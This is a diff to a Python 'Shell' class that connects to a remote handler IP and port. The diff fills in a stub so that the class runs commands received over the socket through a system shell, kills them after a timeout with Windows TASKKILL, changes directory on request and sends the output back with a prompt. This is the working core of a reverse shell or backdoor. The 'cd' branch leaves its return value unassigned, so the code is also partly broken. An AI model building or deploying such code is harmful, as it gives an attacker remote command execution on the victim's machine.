@@ -1,4 +1,4 @@
-import socket
+import socket, subprocess, os, threading
 
 class Shell:
 	def __init__(self, handler_ip, handler_port):
@@ -19,7 +19,16 @@ class Shell:
 		self.comm_socket.sendall(data)
 		
 	def execute_shell_command(self, command):
-		return "whatever man"
+		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+		proc_kill = lambda p: subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=p.pid))
+		timer = threading.Timer(60, proc_kill, [proc])
+		timer.start()
+		out = proc.stdout.read() + proc.stderr.read()
+		timer.cancel()
+		return out
+		
+	def change_directory(self, dir):
+		os.chdir(dir)
 		
 	def handle_command(self, data):
 		command = data.split()[0]
@@ -29,9 +38,13 @@ class Shell:
 			pass
 			
 		if command == "test":
-			return "test successful"
+			output = "test successful"
+		elif command == "cd":
+			self.change_directory(arguments)
 		else:
-			return self.execute_shell_command(command+" "+arguments)
+			output = self.execute_shell_command(command+" "+arguments)
+			
+		return output + "\n" + os.getcwd() + ">> "
 		
 		
 	def run(self):
